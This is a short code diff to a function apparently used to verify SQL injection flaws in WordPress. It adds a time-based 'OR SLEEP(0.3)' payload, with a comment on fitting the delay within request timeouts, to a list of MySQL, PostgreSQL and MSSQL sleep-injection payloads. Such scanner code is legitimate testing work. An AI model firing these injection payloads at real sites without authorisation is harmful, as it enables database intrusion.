@@ -4901,6 +4901,11 @@ def verify_wordpress_sqli(
             (f"{orig_value}' AND SLEEP(5)-- -", f"{orig_value}' AND SLEEP(0)-- -"),
             (f"{orig_value} AND SLEEP(5)-- -", f"{orig_value} AND SLEEP(0)-- -"),
             (f"{orig_value}' OR SLEEP(5)-- -", f"{orig_value}' OR SLEEP(0)-- -"),
+            # Small-SLEEP OR variant: fires for every table row (N×SLEEP), so SLEEP(5) can
+            # easily exceed the 20s request timeout when the table has many rows (e.g. postmeta
+            # with 20-30 WP core rows). SLEEP(0.3) keeps the total at ~6-9s even with 30 rows,
+            # well within timeout and above the 3.5s detection threshold.
+            (f"{orig_value}' OR SLEEP(0.3)-- -", f"{orig_value}' OR SLEEP(0)-- -"),
             (f"{orig_value}' AND pg_sleep(5)-- -", f"{orig_value}' AND pg_sleep(0)-- -"),
             (f"{orig_value} AND pg_sleep(5)-- -", f"{orig_value} AND pg_sleep(0)-- -"),
             (f"{orig_value}';WAITFOR DELAY '0:0:5'--", f"{orig_value}';WAITFOR DELAY '0:0:0'--"),
